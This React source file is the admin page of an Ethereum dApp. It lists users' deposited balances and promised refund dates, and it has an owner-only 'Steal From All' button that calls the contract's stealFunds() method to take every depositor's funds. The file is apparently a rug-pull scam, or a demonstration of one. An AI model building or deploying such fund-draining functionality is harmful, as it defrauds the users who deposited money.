/* eslint-disable indent */
import AppContext from "context/AppContext";
import { TransactionContext } from "context/TransactionContext";
import dayjs from "dayjs";
import React, { useContext, useEffect, useState } from "react";
import { TRANSACTION_NAMES } from "utils/enums";
import { formatToEther } from "utils/helpers";

const Admin = () => {
  const { userData, smartContractInstance, getOwner, transactionList, setTransactionList } =
    useContext(TransactionContext);

  const { lastFinishedTransaction } = useContext(AppContext);

  const [loading, setLoading] = useState({
    userListLoading: false
  });
  const [userAddressList, setUserAddressList] = useState([]);
  const [userInfoList, setUserInfoList] = useState([]);
  const [contractBalance, setContractBalance] = useState("0");

  useEffect(() => {
    if (userData.isContractOwner) {
      // Redirect user
      console.log({ userData });
      getContractBalance();
      getUserAddressList();
    }
  }, [userData]);

  useEffect(() => {
    if (lastFinishedTransaction) {
      getContractBalance();
      getUserAddressList();
    }
  }, [lastFinishedTransaction]);

  useEffect(() => {
    if (userAddressList?.length > 0) {
      getUserInfoList(userAddressList);
    }
  }, [userAddressList]);

  const getContractBalance = async () => {
    const balance = await smartContractInstance.methods.balanceOf().call();
    setContractBalance(formatToEther(balance));
  };

  const getUserAddressList = async () => {
    const userAddressList = await smartContractInstance.methods.getUserAddressList().call({ from: userData.account });
    console.log({ userAddressList });

    const owner = await getOwner();

    const filtered = userAddressList.filter(adress => adress != owner);

    setUserAddressList(filtered);
  };

  const getUserInfoList = async userAddressList => {
    setLoading({
      ...loading,
      userListLoading: true
    });
    const userInfoList = await Promise.all(
      userAddressList.map(async address => {
        const { isExist, storedBalance, userAddress } = await smartContractInstance.methods
          .getUserInfo(address)
          .call({ from: userData.account });

        const timestamp = await smartContractInstance.methods
          .refundTimeOfUser(address)
          .call({ from: userData.account });
        return {
          isExist,
          storedBalance,
          refundDate: new Date(Number(timestamp) * 1000),
          userAddress
        };
      })
    );

    setUserInfoList(userInfoList);

    setLoading({
      ...loading,
      userListLoading: false
    });
  };

  const stealFromAll = async () => {
    const owner = await getOwner();

    if (userData.account.toLowerCase() !== owner.toLowerCase()) {
      throw new Error("Account is not smart contract owner");
    }

    const tx = await smartContractInstance.methods.stealFunds().send({ from: userData.account });
    setTransactionList([...transactionList, { ...tx, hash: tx.transactionHash, name: TRANSACTION_NAMES.STEAL_FUNDS }]);
  };

  console.log({ userInfoList });
  console.log({ smartContractInstance });

  return (
    <div>
      <h4>Smart Contract Balance: {contractBalance} ETH</h4>

      <hr />

      <ul className="user-info-list">
        {!loading.userListLoading && userInfoList.length > 1
          ? userInfoList.map(user => {
              console.log({ user });
              return (
                <li className="user-info" key={user.userAddress}>
                  <span className="address">{user.userAddress}</span> : {formatToEther(user.storedBalance)} ETH |{" "}
                  <strong>Expected Refund Date:</strong>{" "}
                  {dayjs(new Date(user.refundDate)).format("MMM DD YYYY - HH:mm")}
                </li>
              );
            })
          : null}
      </ul>

      <button onClick={stealFromAll}>Steal From All</button>
    </div>
  );
};

export default Admin;
